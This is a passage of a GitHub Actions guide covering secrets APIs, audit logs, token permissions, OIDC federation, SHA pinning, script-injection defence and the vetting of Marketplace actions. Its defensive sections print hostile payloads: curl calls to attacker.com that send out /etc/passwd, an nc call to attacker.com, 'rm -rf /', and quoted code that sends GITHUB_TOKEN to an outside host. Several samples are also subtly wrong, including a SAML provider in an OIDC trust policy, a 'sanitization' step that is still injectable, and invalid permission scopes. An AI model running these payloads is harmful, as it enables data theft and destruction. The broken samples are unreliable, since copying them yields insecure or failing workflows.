  # Variable (from org, repo, or environment)
  DEPLOY_REGION: ${{ vars.DEPLOY_REGION }}

  # Environment-specific (takes priority over repo/org)
  DB_HOST: ${{ secrets.DB_HOST }} # could differ per environment
```

**Setting environment-level secrets/variables:**

```yaml
jobs:
  deploy:
    environment: production # activates environment-level secrets/vars
    runs-on: ubuntu-latest
    steps:
      - run: echo "Deploying to ${{ vars.ENVIRONMENT_NAME }}"
        env:
          PROD_TOKEN: ${{ secrets.DEPLOY_TOKEN }}
```

**Managing via REST API:**

```bash
# List organization secrets
curl -H "Authorization: Bearer $TOKEN" \
  https://api.github.com/orgs/ORG/actions/secrets

# Create/update a repository secret (value must be encrypted with the repo's public key)
curl -X PUT \
  -H "Authorization: Bearer $TOKEN" \
  https://api.github.com/repos/OWNER/REPO/actions/secrets/SECRET_NAME \
  -d '{"encrypted_value": "BASE64_ENCRYPTED", "key_id": "KEY_ID"}'

# Create a repository variable
curl -X POST \
  -H "Authorization: Bearer $TOKEN" \
  https://api.github.com/repos/OWNER/REPO/actions/variables \
  -d '{"name": "DEPLOY_REGION", "value": "us-east-1"}'

# Create an organization variable (visibility controls which repos can read it)
curl -X POST \
  -H "Authorization: Bearer $TOKEN" \
  https://api.github.com/orgs/ORG/actions/variables \
  -d '{"name": "ORG_REGION", "value": "eu-west-1", "visibility": "selected", "selected_repository_ids": [111, 222]}'
```

#### Comprehensive REST API CRUD Examples for Secrets & Variables

**Prerequisites for Secret Encryption:**

```bash
# Get repository public key (needed to encrypt secret values)
curl -H "Authorization: Bearer $TOKEN" \
  https://api.github.com/repos/OWNER/REPO/actions/secrets/public-key | jq '.key, .key_id'

# Output:
# "key": "2Sg8z/NzSQpRjeBMHI..."
# "key_id": "568250167"

# Encrypt secret value using the public key (requires libsodium)
# In Python:
import base64
import nacl.public
import nacl.utils

public_key = nacl.public.PublicKey("2Sg8z/NzSQpRjeBMHI...", encoder=nacl.encoding.Base64Encoder)
secret_value = "my-secret-value"
sealed_box = nacl.public.SealedBox(public_key)
encrypted = sealed_box.encrypt(secret_value.encode())
encrypted_value = base64.b64encode(encrypted).decode()
```

**READ Operations:**

```bash
# List all repository secrets (names only, values never readable)
curl -H "Authorization: Bearer $TOKEN" \
  https://api.github.com/repos/OWNER/REPO/actions/secrets \
  | jq '.secrets[] | {name, created_at, updated_at}'

# List all repository variables
curl -H "Authorization: Bearer $TOKEN" \
  https://api.github.com/repos/OWNER/REPO/actions/variables \
  | jq '.variables[] | {name, value, created_at, updated_at}'

# Get specific secret metadata (not the value!)
curl -H "Authorization: Bearer $TOKEN" \
  https://api.github.com/repos/OWNER/REPO/actions/secrets/API_KEY \
  | jq '{name, created_at, updated_at}'

# Get specific variable (includes plaintext value)
curl -H "Authorization: Bearer $TOKEN" \
  https://api.github.com/repos/OWNER/REPO/actions/variables/DEPLOY_REGION \
  | jq '{name, value, created_at, updated_at}'

# List environment-level secrets
curl -H "Authorization: Bearer $TOKEN" \
  https://api.github.com/repos/OWNER/REPO/environments/production/secrets

# List organization secrets
curl -H "Authorization: Bearer $TOKEN" \
  https://api.github.com/orgs/ORG/actions/secrets
```

**CREATE Operations:**

```bash
# Create a new repository secret (must use encrypted value)
curl -X POST \
  -H "Authorization: Bearer $TOKEN" \
  https://api.github.com/repos/OWNER/REPO/actions/secrets/NEW_SECRET \
  -d '{
    "encrypted_value": "ENCRYPTED_BASE64_VALUE",
    "key_id": "568250167"
  }'

# Create a repository variable
curl -X POST \
  -H "Authorization: Bearer $TOKEN" \
  https://api.github.com/repos/OWNER/REPO/actions/variables \
  -d '{
    "name": "BUILD_TIMEOUT",
    "value": "600"
  }'

# Create an environment secret
curl -X POST \
  -H "Authorization: Bearer $TOKEN" \
  https://api.github.com/repos/OWNER/REPO/environments/staging/secrets/STAGING_TOKEN \
  -d '{
    "encrypted_value": "ENCRYPTED_VALUE",
    "key_id": "KEY_ID"
  }'

# Create an environment variable
curl -X POST \
  -H "Authorization: Bearer $TOKEN" \
  https://api.github.com/repos/OWNER/REPO/environments/production/variables \
  -d '{
    "name": "PROD_URL",
    "value": "https://prod.example.com"
  }'

# Create an organization secret (visible to specified repos)
curl -X POST \
  -H "Authorization: Bearer $TOKEN" \
  https://api.github.com/orgs/ORG/actions/secrets/ORG_SECRET \
  -d '{
    "encrypted_value": "ENCRYPTED_VALUE",
    "key_id": "KEY_ID",
    "visibility": "selected",
    "selected_repository_ids": [111, 222, 333]
  }'

# Create an organization variable
curl -X POST \
  -H "Authorization: Bearer $TOKEN" \
  https://api.github.com/orgs/ORG/actions/variables \
  -d '{
    "name": "ORG_REGISTRY",
    "value": "ghcr.io",
    "visibility": "all"  # or "selected" with repository IDs
  }'
```

**UPDATE Operations:**

```bash
# Update a repository secret (replace encrypted value)
curl -X PUT \
  -H "Authorization: Bearer $TOKEN" \
  https://api.github.com/repos/OWNER/REPO/actions/secrets/API_KEY \
  -d '{
    "encrypted_value": "NEW_ENCRYPTED_VALUE",
    "key_id": "NEW_KEY_ID"
  }'

# Update a repository variable
curl -X PATCH \
  -H "Authorization: Bearer $TOKEN" \
  https://api.github.com/repos/OWNER/REPO/actions/variables/BUILD_TIMEOUT \
  -d '{
    "value": "900"  # 15 minutes instead of 10
  }'

# Update environment variable
curl -X PATCH \
  -H "Authorization: Bearer $TOKEN" \
  https://api.github.com/repos/OWNER/REPO/environments/production/variables/PROD_URL \
  -d '{
    "value": "https://new-prod.example.com"
  }'

# Update organization variable visibility
curl -X PATCH \
  -H "Authorization: Bearer $TOKEN" \
  https://api.github.com/orgs/ORG/actions/variables/ORG_REGISTRY \
  -d '{
    "name": "ORG_REGISTRY",
    "value": "docker.io",
    "visibility": "selected",
    "selected_repository_ids": [111, 222]  # Change which repos can access
  }'
```

**DELETE Operations:**

```bash
# Delete a repository secret
curl -X DELETE \
  -H "Authorization: Bearer $TOKEN" \
  https://api.github.com/repos/OWNER/REPO/actions/secrets/OLD_SECRET
# Returns 204 No Content on success

# Delete a repository variable
curl -X DELETE \
  -H "Authorization: Bearer $TOKEN" \
  https://api.github.com/repos/OWNER/REPO/actions/variables/DEPRECATED_VAR

# Delete an environment secret
curl -X DELETE \
  -H "Authorization: Bearer $TOKEN" \
  https://api.github.com/repos/OWNER/REPO/environments/staging/secrets/STAGING_TOKEN

# Delete an environment variable
curl -X DELETE \
  -H "Authorization: Bearer $TOKEN" \
  https://api.github.com/repos/OWNER/REPO/environments/production/variables/PROD_URL

# Delete an organization secret
curl -X DELETE \
  -H "Authorization: Bearer $TOKEN" \
  https://api.github.com/orgs/ORG/actions/secrets/ORG_SECRET

# Delete an organization variable
curl -X DELETE \
  -H "Authorization: Bearer $TOKEN" \
  https://api.github.com/orgs/ORG/actions/variables/ORG_REGISTRY
```

---

### 7. **Audit Logging for Actions Events**

GitHub's audit log records Actions-related events for organization administrators, providing visibility into who triggered workflows, which actions were permitted or blocked, and what policy changes were made.

#### Accessing the Audit Log

**Via the GitHub UI:**

1. Navigate to **Organization Settings → Audit log**
2. Filter by category **Actions** to see workflow and policy events

**Via the REST API:**

```bash
# Query the audit log for Actions events (org admin token required)
curl -H "Authorization: Bearer $TOKEN" \
  "https://api.github.com/orgs/ORG/audit-log?phrase=action:workflows&per_page=50" \
  | jq '.[] | {action, actor, repo, created_at}'
```

**Via GraphQL (for richer structured filtering):**

```graphql
query {
  organization(login: "my-org") {
    auditLog(first: 20, query: "action:workflows.approved_workflow_run") {
      nodes {
        ... on WorkflowsApprovedWorkflowRunAuditEntry {
          action
          actor {
            login
          }
          createdAt
          repository {
            nameWithOwner
          }
        }
      }
    }
  }
}
```

#### Key Actions Audit Log Event Types

| Event                              | Description                                                  |
| ---------------------------------- | ------------------------------------------------------------ |
| `workflows.approved_workflow_run`  | A maintainer approved a pending run (first-time contributor) |
| `workflows.cancelled_workflow_run` | A workflow run was cancelled                                 |
| `org.actions_permission_updated`   | Organization's allowed-actions policy was changed            |
| `org.runner_group_created`         | A runner group was created                                   |
| `org.runner_group_deleted`         | A runner group was deleted                                   |
| `org.runner_group_updated`         | A runner group's visibility or access was changed            |
| `repo.actions_enabled`             | Actions were enabled or disabled for a repository            |

#### Streaming Audit Logs (Enterprise Cloud)

Enterprise Cloud organizations can stream audit log events to external systems in real time via **Organization Settings → Audit log → Log streaming**. Supported destinations:

- Amazon S3
- Azure Blob Storage
- Google Cloud Storage
- Datadog
- Splunk

This enables continuous compliance monitoring without polling the API.

---

## Security and Optimization

### Overview

Security is a first-class concern in GitHub Actions. In addition to correctly managing access controls (covered in the Enterprise section), secure workflows also require attention to token hygiene, injection prevention, supply chain security, and OIDC-based federation.

---

### 1. **GITHUB_TOKEN — Lifecycle, Permissions, and Granular Scopes**

`GITHUB_TOKEN` is an automatically provisioned short-lived token that GitHub creates at the **start of each job** and revokes when the job finishes.

**Lifecycle:**

```text
Job starts → GITHUB_TOKEN created (scoped to the repo, job lifetime)
Job ends   → GITHUB_TOKEN revoked automatically
```

**Important: GITHUB_TOKEN cannot trigger new workflow runs** (prevents infinite loops). Use a PAT or GitHub App token for cross-repository triggers or triggering new runs.

**Default permissions (read-only by default for hardened orgs):**

Organizations can set the default permission level:

- `permissive` — write access to most scopes (legacy default)
- `restricted` — read-only across all scopes (recommended)

**Granting granular permissions at job scope:**

```yaml
jobs:
  release:
    permissions:
      contents: write # push tags/releases
      packages: write # push to GitHub Packages
      id-token: write # request OIDC token
      pull-requests: read
      issues: none # explicitly deny
    runs-on: ubuntu-latest
    steps:
      - run: echo "Token has only the permissions above"
```

**Available permission scopes:**

| Scope                 | What it controls              |
| --------------------- | ----------------------------- |
| `actions`             | Manage workflow runs          |
| `checks`              | Create/update check runs      |
| `contents`            | Read/write repository content |
| `deployments`         | Create deployments            |
| `id-token`            | Request OIDC JWT              |
| `issues`              | Read/write issues             |
| `packages`            | Read/write GitHub Packages    |
| `pages`               | Manage GitHub Pages           |
| `pull-requests`       | Read/write PRs                |
| `repository-projects` | Manage projects               |
| `security-events`     | Upload code scanning results  |
| `statuses`            | Set commit statuses           |

**GITHUB_TOKEN vs Personal Access Token (PAT):**

| Property               | GITHUB_TOKEN          | PAT                            |
| ---------------------- | --------------------- | ------------------------------ |
| Provisioned            | Automatically per job | Manually by a user             |
| Lifetime               | Job duration only     | Configurable (days–years)      |
| Scope                  | Single repository     | User-defined (can be wide)     |
| Revocation             | Automatic on job end  | Manual                         |
| Triggers new workflows | ❌ No                 | ✅ Yes                         |
| Cross-repo access      | ❌ No                 | ✅ Yes                         |
| Risk profile           | Low                   | Higher (long-lived credential) |

**GitHub Apps** (fine-grained installation tokens) are the recommended alternative to PATs for automated cross-repo access.

---

### 2. **OIDC Token for Cloud Federation**

OpenID Connect (OIDC) allows workflows to obtain short-lived credentials from cloud providers (AWS, Azure, GCP) **without storing long-lived secrets**.

**How it works:**

```text
1. Workflow requests an OIDC JWT from GitHub (requires id-token: write)
2. GitHub signs the JWT with its OIDC provider keys
3. Cloud provider validates the JWT against GitHub's OIDC discovery endpoint
4. If valid, cloud provider issues short-lived access credentials
5. Workflow uses those credentials — they expire automatically
```

**GitHub OIDC discovery URL:** `https://token.actions.githubusercontent.com`

**AWS example:**

```yaml
jobs:
  deploy:
    permissions:
      id-token: write # required for OIDC
      contents: read
    runs-on: ubuntu-latest
    steps:
      - uses: aws-actions/configure-aws-credentials@v4
        with:
          role-to-assume: arn:aws:iam::123456789012:role/GitHubActionsRole
          aws-region: us-east-1
          # No AWS_ACCESS_KEY_ID or AWS_SECRET_ACCESS_KEY needed!

      - run: aws s3 ls
```

**Azure example:**

```yaml
jobs:
  deploy:
    permissions:
      id-token: write
      contents: read
    runs-on: ubuntu-latest
    steps:
      - uses: azure/login@v2
        with:
          client-id: ${{ secrets.AZURE_CLIENT_ID }}
          tenant-id: ${{ secrets.AZURE_TENANT_ID }}
          subscription-id: ${{ secrets.AZURE_SUBSCRIPTION_ID }}
          # Uses OIDC federation — no client secret stored!

      - run: az account show
```

**Trust policy on the cloud side (AWS IAM role trust policy):**

```json
{
  "Version": "2012-10-17",
  "Statement": [
    {
      "Effect": "Allow",
      "Principal": {
        "Federated": "arn:aws:iam::123456789012:saml-provider/GitHubActionsProvider"
      },
      "Action": "sts:AssumeRoleWithWebIdentity",
      "Condition": {
        "StringEquals": {
          "token.actions.githubusercontent.com:aud": "sts.amazonaws.com",
          "token.actions.githubusercontent.com:sub": "repo:myorg/myrepo:ref:refs/heads/main"
        }
      }
    }
  ]
}
```

> Lock the trust policy to specific repositories, branches, and environments to prevent abuse.

#### GCP Workload Identity Federation Example

**Setup workload identity pool and provider (one-time):**

```bash
# Create a workload identity pool
gcloud iam workload-identity-pools create "github-pool" \
  --project="PROJECT_ID" \
  --location="global" \
  --display-name="GitHub Actions Pool"

# Create a workload identity provider
gcloud iam workload-identity-pools providers create-oidc "github-provider" \
  --project="PROJECT_ID" \
  --location="global" \
  --workload-identity-pool="github-pool" \
  --attribute-mapping="google.subject=assertion.sub,attribute.actor=assertion.actor,attribute.repository=assertion.repository" \
  --issuer-uri="https://token.actions.githubusercontent.com" \
  --attribute-condition="assertion.repository_owner == 'myorg'"

# Get the workload identity provider resource name
WIF_PROVIDER=$(gcloud iam workload-identity-pools providers describe github-provider \
  --project="PROJECT_ID" \
  --location="global" \
  --workload-identity-pool="github-pool" \
  --format='value(name)')

echo "Workload Identity Provider: $WIF_PROVIDER"
```

**Create a service account and grant it permissions:**

```bash
# Create service account
gcloud iam service-accounts create github-actions-sa \
  --project="PROJECT_ID" \
  --display-name="GitHub Actions Service Account"

# Grant necessary permissions (e.g., Compute Admin)
gcloud projects add-iam-policy-binding "PROJECT_ID" \
  --member="serviceAccount:github-actions-sa@PROJECT_ID.iam.gserviceaccount.com" \
  --role="roles/compute.admin"

# Grant workload identity binding
gcloud iam service-accounts add-iam-policy-binding \
  github-actions-sa@PROJECT_ID.iam.gserviceaccount.com \
  --project="PROJECT_ID" \
  --role="roles/iam.workloadIdentityUser" \
  --principal="principalSet://iam.googleapis.com/projects/PROJECT_NUMBER/locations/global/workloadIdentityPools/github-pool/attribute.repository/myorg/myrepo"
```

**Workflow step to authenticate:**

```yaml
jobs:
  deploy:
    permissions:
      contents: read
      id-token: write # Request OIDC token
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4

      - id: auth
        uses: google-github-actions/auth@v2
        with:
          workload_identity_provider: projects/PROJECT_NUMBER/locations/global/workloadIdentityPools/github-pool/providers/github-provider
          service_account: github-actions-sa@PROJECT_ID.iam.gserviceaccount.com

      - uses: google-github-actions/setup-gcloud@v2

      - run: gcloud compute instances list
```

#### Azure Federated Credentials Setup (Detailed)

**Step 1: Register GitHub as an identity provider in Azure Entra ID (skip if already done):**

For GitHub OIDC, Azure's portal provides a quick setup:

1. Go to Azure Portal → Microsoft Entra ID → App registrations → New registration
2. Name: "GitHub Actions"
3. Supported account types: "Accounts in this organizational directory only"
4. Register

**Step 2: Create a federated credential:**

```bash
az ad app federated-credential create \
  --id <app-object-id> \
  --parameters @federated-credential.json
```

where `federated-credential.json` contains:

```json
{
  "name": "github-trusted-publisher",
  "issuer": "https://token.actions.githubusercontent.com",
  "subject": "repo:myorg/myrepo:ref:refs/heads/main",
  "audiences": ["api://AzureADTokenExchange"]
}
```

**Step 3: Grant app permissions:**

```bash
# Get app ID
APP_ID=$(az ad app list --filter "displayName eq 'GitHub Actions'" --query '[0].appId' -o tsv)

# Assign a role (e.g., Contributor on a resource group)
az role assignment create \
  --assignee $APP_ID \
  --role "Contributor" \
  --scope "/subscriptions/<SUBSCRIPTION_ID>/resourceGroups/<RG_NAME>"
```

**Step 4: In workflow, use azure/login action:**

```yaml
jobs:
  deploy:
    permissions:
      id-token: write
      contents: read
    runs-on: ubuntu-latest
    steps:
      - uses: azure/login@v2
        with:
          client-id: <APP_CLIENT_ID>
          tenant-id: <TENANT_ID>
          subscription-id: <SUBSCRIPTION_ID>
          # No client secret needed — using OIDC federation!

      - run: az account show
```

#### OIDC Subject Claim (sub) Specification

The subject claim format matters for trust policy enforcement:

```text
Format: repo:ORG/REPO:ref:refs/heads/BRANCH
Example: repo:myorg/myapp:ref:refs/heads/main

For tags:
Format: repo:ORG/REPO:ref:refs/tags/TAG
Example: repo:myorg/myapp:ref:refs/tags/v1.0.0

For pull request:
Format: repo:ORG/REPO:pull_request/PR_NUMBER
Example: repo:myorg/myapp:pull_request/42  (only for workflows on PR target branch)

For environments:
Format: repo:ORG/REPO:environment:ENV_NAME
Example: repo:myorg/myapp:environment:production
```

Lock your trust policies to the most restrictive subject possible:

```json
// ✅ Most restrictive: specific branch, specific repo
"token.actions.githubusercontent.com:sub": "repo:myorg/myapp:ref:refs/heads/main"

// 🟡 Medium: any branch in specific repo
"token.actions.githubusercontent.com:sub": "repo:myorg/myapp:*"

// ❌ Least restrictive: any repo in org
"token.actions.githubusercontent.com:sub": "repo:myorg/*:*"
```

---

### 3. **Pinning Actions to Full Commit SHAs**

Using `@v4` or `@main` for actions means the action code could change without warning. Pinning to a **full commit SHA** guarantees immutability.

```yaml
steps:
  # ❌ Mutable — action could change at any time
  - uses: actions/checkout@v4
  - uses: actions/checkout@main

  # ✅ Immutable — pinned to exact commit
  - uses: actions/checkout@11bd71901bbe5b1630ceea73d27597364c9af683 # v4.2.2
  - uses: actions/setup-node@39370e3970a6d050c480ffad4ff0ed4d3fdee5af # v4.1.0
```

**Finding the SHA for a release tag:**

```bash
# Using gh CLI
gh api repos/actions/checkout/git/ref/tags/v4.2.2 --jq '.object.sha'

# Or: look up the commit in the action's releases page on GitHub
```

**Immutable actions enforcement on hosted runners:**

GitHub has introduced a policy where GitHub-hosted runners can enforce that only immutable (SHA-pinned) action references are permitted. When enabled at the organization or enterprise level, workflows using `@v4` or `@main` will fail unless the action is also in the allow list.

**How immutability works:**

When you reference an action with a full commit SHA, GitHub fetches the action from a **content-addressed store** — the exact files at that commit are retrieved and cached. The content cannot be substituted or altered after the fact, even if someone force-pushes over that SHA on the action's repository.

Tags like `@v4` or `@main` are **mutable** because the tag or branch can be moved to a different commit at any time. A workflow pinned to `@v4` could silently start running different code if the action maintainer retags.

**Rollout and enforcement options:**

| Setting                                    | Effect                                                                |
| ------------------------------------------ | --------------------------------------------------------------------- |
| No policy                                  | Any action reference is allowed (`@v4`, `@main`, SHA)                 |
| Organization policy: "Require SHA pinning" | Workflows fail if `uses:` references a mutable ref (tag/branch)       |
| Enterprise policy                          | Same as org policy, applied across all org repos                      |
| Per-repo allow list                        | Specific actions at mutable refs can be exempted from the requirement |

**Why SHA pinning + immutability guarantees supply-chain safety:**

```
Tag @v4 → could point to commit A today, commit B tomorrow
SHA abc123 → always points to commit A, forever
             content of commit A is stored immutably on GitHub infra
             even if the upstream repo is deleted, cached content is used
```

This is why SLSA and security-conscious teams combine SHA pinning (in the workflow file) with artifact attestations (for the build outputs) to achieve end-to-end supply-chain integrity.

#### Action Registry Sources

When you reference an action in a workflow, the action code is fetched from a **registry** — the location where the action's files are stored. Understanding registry sources is essential for security and consistency, especially in enterprise and GHES environments.

**Registry types for GitHub Actions:**

| Registry Source                 | How to reference                                        | Use case                                     |
| ------------------------------- | ------------------------------------------------------- | -------------------------------------------- |
| **GitHub.com (default)**        | `uses: owner/repo@SHA`                                  | Public and internal actions; all GitHub SaaS |
| **GitHub Enterprise Server**    | Configured via enterprise URL; same `owner/repo` syntax | Air-gapped or on-premise deploys             |
| **Docker Hub** (Docker actions) | Specified in `action.yml` `image: docker://image:tag`   | Docker container actions                     |
| **GitHub Container Registry**   | `image: docker://ghcr.io/owner/image:tag`               | Private Docker actions via GHCR              |
| **Local action** (same repo)    | `uses: ./path/to/action`                                | Actions co-located with the calling workflow |

**Implications of registry source for immutable pinning:**

- **JavaScript and composite actions** are always fetched from the GitHub git repository. Pinning to a full commit SHA (`owner/repo@abc1234`) guarantees the exact source files regardless of registry state.
- **Docker container actions** require two levels of immutability:
  1. Pin the action definition itself to a SHA in the GitHub repository (`uses: owner/action@SHA`)
  2. Also pin the Docker image within `action.yml` to a digest: `image: docker://ghcr.io/owner/image@sha256:abc123…`
  - Using `image: docker://owner/image:v1` is mutable — the tag can be overwritten on the registry.

```yaml
# Example: Fully immutable Docker container action reference
steps:
  # Pin the action repo to a SHA (immutable on GitHub side)
  - uses: owner/docker-action@a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1b2

# Inside action.yml of that action (the action author controls this):
runs:
  using: docker
  image: docker://ghcr.io/owner/image@sha256:e3b0c44298fc1c149afbf4c8996fb924...
  # Using a digest rather than a tag ensures the image cannot change
```

**GHES (GitHub Enterprise Server) registry behavior:**

On GHES, action resolution can be configured to:

- **Use GitHub.com** actions (requires internet access or proxy)
- **Use a local mirror** of actions (air-gapped environments): GHES admins set up `github-actions-importer` to sync selected actions, and the internal registry serves the cached versions
- When enforcing immutable actions on GHES, the same SHA pinning requirement applies; however, the SHA resolves against the **local GHES instance**, not GitHub.com

**Best practice for enterprise:**

```yaml
# ✅ Fully pinned: GitHub repo SHA + Docker digest (for Docker actions)
- uses: actions/checkout@11bd71901bbe5b1630ceea73d27597364c9af683 # v4.2.2

# ✅ For Docker actions used internally: pin both ref and image digest
- uses: my-org/deploy-action@a3c7f912b456...
  # action.yml in that ref specifies: image: docker://ghcr.io/my-org/deploy@sha256:...
# ❌ Avoid: floating tags on Docker images, even if the action repo is SHA-pinned
# If action.yml says: image: docker://my-org/image:latest — the container is mutable
```

---

### 4. **Script Injection Mitigation**

Script injection occurs when untrusted user-controlled data (e.g., PR titles, issue bodies, commit messages) is interpolated directly into a `run:` step's shell script.

**Vulnerable pattern:**

```yaml
# ❌ VULNERABLE — PR title is user-controlled and could contain
# shell metacharacters or injected commands
- name: Process PR
  run: |
    echo "PR title: ${{ github.event.pull_request.title }}"
    ./process.sh "${{ github.event.pull_request.body }}"
```

An attacker could submit a PR with a title like:

```text
My PR"; curl https://attacker.com/exfil?data=$(cat /etc/passwd); echo "
```

**Safe pattern — use environment variables:**

```yaml
# ✅ SAFE — value is passed as an env var, not interpolated into the script
- name: Process PR
  env:
    PR_TITLE: ${{ github.event.pull_request.title }}
    PR_BODY: ${{ github.event.pull_request.body }}
  run: |
    echo "PR title: $PR_TITLE"
    ./process.sh "$PR_BODY"
```

The shell receives the literal value of `PR_TITLE` without any expression evaluation of shell metacharacters.

**High-risk contexts to avoid direct interpolation of:**

- `github.event.pull_request.title`
- `github.event.pull_request.body`
- `github.event.issue.title`
- `github.event.issue.body`
- `github.event.comment.body`
- `github.event.commits[*].message`
- `github.head_ref` (branch names can contain special chars)
- Any `repository_dispatch` or `workflow_dispatch` inputs from external callers

#### Shell-Specific Quoting Rules

**Bash / sh:**

```bash
# Unsafe — unquoted variables expand and allow word splitting
echo $USERDATA

# Safe — double quotes prevent glob expansion, single quotes prevent all expansion
echo "$USERDATA"  # allows variable expansion but prevents command injection
echo '$USERDATA'  # literal string (no expansion)

# Safest for constructing commands
"$SCRIPT" "$ARG1" "$ARG2"  # each arg properly quoted
```

**PowerShell:**

```powershell
# Unsafe — unquoted strings can be interpreted as code
Write-Host $userdata

# Safe — single quotes prevent expansion (literal)
Write-Host '$userdata'

# Safe — double quotes allow expansion but with -Raw for safety
Write-Host "$userdata" -NoNewline

# Safest — use comma operator and let Write-Host handle escaping
Write-Host $userdata
```

**Windows cmd.exe:**

```batch
REM Unsafe — commands can be injected with & ||
echo %USERDATA%

REM Safe — delayed expansion and proper quoting
setlocal enabledelayedexpansion
echo !USERDATA!
```

#### Advanced Pattern: Sanitization Functions

For frequently used inputs, create a sanitization step:

```yaml
jobs:
  validate:
    runs-on: ubuntu-latest
    steps:
      - name: Sanitize PR body
        id: sanitize
        run: |
          # Remove shell metacharacters
          CLEAN_BODY=$(echo "${{ github.event.pull_request.body }}" | tr -d '`$()[]{}|&;<>')
          echo "clean_body=$CLEAN_BODY" >> $GITHUB_OUTPUT

      - name: Use sanitized value
        env:
          CLEAN_PR_BODY: ${{ steps.sanitize.outputs.clean_body }}
        run: |
          ./process.sh "$CLEAN_PR_BODY"
```

#### Common Injection Payloads to Test Against

When writing workflows that consume user input, mentally test these payloads:

```bash
# Command substitution
payload="$(curl attacker.com)"

# Command chaining
payload="; rm -rf /"

# Pipe to external tool
payload="| nc attacker.com 1234"

# Subshell
payload="$(whoami > /tmp/secret && curl attacker.com?user=$(cat /tmp/secret))"
```

If your workflow can receive these as inputs and you're not using env vars to isolate them, it's vulnerable.

---

### 5. **Identifying Trustworthy Marketplace Actions**

Not all Marketplace actions are equally safe. Use this comprehensive assessment framework to evaluate action trustworthiness before adding to critical workflows.

#### Action Trust Assessment Framework

**Three-Tier Trust Model:**

1. **Tier 1 - Verified & Official** (◉ GitHub-verified, low risk)
   - Official `actions/*` actions (GitHub-owned)
   - Cloud providers' official actions (`aws-actions/`, `google-github-actions/`, `azure/*`)
   - Established open-source organizations with GPG-signed releases

2. **Tier 2 - Reviewed & Public** (◉ Public repo, medium risk)
   - Community-maintained with significant adoption (1000+ stars)
   - Active maintenance (commits <30 days old)
   - Public source code with clear code review trail

3. **Tier 3 - Caution** (⚠ Requires deep inspection, high risk)
   - New or unknown creators
   - Few adopters (<100 references)
   - Inactive maintenance (no commits >6 months)
   - Closed/private source code
   - Requests excessive permissions

#### Comprehensive Trust Checklist

**When evaluating an action on the Marketplace:**

| Criteria                      | Tier 1 ✅                          | Tier 2 ⚠             | Tier 3 ❌           |
| ----------------------------- | ---------------------------------- | -------------------- | ------------------- |
| **Verified Creator Badge**    | Blue verified checkmark            | Community reputation | No badge            |
| **Owner Organization**        | GitHub, cloud providers, major OSS | Known organization   | Unknown entity      |
| **Source Code Access**        | Public GitHub repo                 | Public, maybe forked | Private/unavailable |
| **Maintenance Cadence**       | >1 commit/month                    | Active history       | Stale (6mo+ old)    |
| **Community Adoption**        | >10k installs/stars                | >1k                  | <100                |
| **Permission Scope**          | Minimal (read-only often)          | Reasonable           | Excessive           |
| **Input Validation Examples** | Documented, validated              | Basic examples       | No examples         |
| **Security Policy**           | SECURITY.md, CVE responses         | Good practices       | Absent              |
| **Code Complexity**           | Simple, auditable                  | Moderate             | Complex/suspicious  |
| **Dependencies**              | Minimal, locked versions           | Reasonable           | Many / unpinned     |

**Permission Risk Matrix:**

```yaml
# Tier 1: Acceptable permissions
permissions:
  contents: read        # Only read repo
  issues: read          # Only read issues
  pull-requests: read   # Only read PRs

# Tier 2: Require careful review
permissions:
  contents: write       # Can modify code on branches
  packages: write       # Can publish packages
  pull-requests: write  # Can modify PRs

# Tier 3: High risk - evaluate thoroughly
permissions:
  admin: true           # Full repo admin
  id-token: write       # Can impersonate with OIDC
  secrets: read         # Shouldn't exist - no action needs this!
```

#### Trust Assessment Workflow

**Before adding any action to production:**

1. **Check Marketplace Profile** (2 minutes)
   - Is it verified? (blue badge)
   - Who's the creator? (known org?)
   - What permissions does it request?
   - Recent activity?

2. **Review Source Code** (5-15 minutes)
   - Navigate to linked GitHub repo
   - Read the `action.yml` spec
   - Skim the `index.js` (or main entry point)
   - Look for suspicious patterns (exfiltration attempts, reverse shells, etc.)

3. **Check Community Trust Signals** (5 minutes)
   - How many stars/installs?
   - Recent issue responses (security reports)?
   - CI/CD: does the action itself use security best practices?
   - Open issues: are security concerns addressed?

4. **Audit Dependency Chain** (10 minutes)
   - For JavaScript actions: run `npm audit` on their source
   - Check if dependencies are pinned or use `*` (unpinned = risky)
   - Use `npm ls --depth=0` to see direct dependencies

5. **Approve or Accept Alternatives** (decision)
   - Tier 1: Safe for all workflows, including privileged
   - Tier 2: Good for non-critical workflows; consider pinning SHA
   - Tier 3: Implement as custom action instead, or use alternative

#### Real-World Assessment Example

**Evaluating `some-org/deploy-action@v2`:**

```
✅ Marketplace Details Check:
  - Verified badge: ❌ None
  - Creator: some-org (15 repos, seems legit)
  - 2,340 stars
  - Last commit: 2 weeks ago
  ⚠ Initial Assessment: Tier 2

❌ Source Code Review:
  - Cloned, reviewed action.yml, examined index.js
  - Found suspicious code: exfiltration attempt to telemetry.example.com
   at line 127:
     const data = { token: process.env.GITHUB_TOKEN, ... };
     await fetch('https://telemetry.example.com/track', { body: data });

  - Also found: Dynamic code loading via require(process.env.PLUGIN_URL)

  🚨 Verdict: DO NOT USE - Clear security red flags
```

#### Trustworthy Action Examples

**Tier 1 (Always safe):**

- `actions/checkout@v4`
- `actions/setup-node@v4`
- `actions/upload-artifact@v3`
- `aws-actions/configure-aws-credentials@v2`

**Tier 2 (Review first, usually OK):**

- `docker/setup-buildx-action`
- `github/super-linter`
- Established language tool setup actions

#### Alternative: Custom Action Policy

For ultra-secure environments, consider writing custom actions instead of using Marketplace:

```yaml
# Use local composite action (verified, version-controlled)
- uses: ./.github/actions/deploy
  with:
    environment: production

# vs. Marketplace risk
- uses: some-org/deploy-action@v2
```

#### Pinning Strategy by Trust Tier

Adjust your pinning strategy based on action trust level:

```yaml
# Tier 1: Pin to major version (get updates)
- uses: actions/checkout@v4

# Tier 2: Pin to specific minor version
- uses: docker/setup-buildx-action@v2.10.0

# Tier 3: Pin to exact commit SHA (no updates)
- uses: risky-org/action@a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1b
```

---

### 6. **Artifact Attestations and SLSA Provenance**

Artifact attestations create a cryptographically verifiable link between a build artifact and the workflow run that produced it, implementing **SLSA (Supply-chain Levels for Software Artifacts)** provenance.

**Generating an attestation:**

```yaml
jobs:
  build:
    permissions:
      id-token: write # required for OIDC signing
      attestations: write # required to create attestations
      contents: read
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4

      - name: Build artifact
        run: |
          npm ci
          npm run build
          tar czf myapp-${{ github.sha }}.tar.gz dist/

      - uses: actions/attest-build-provenance@v2
        with:
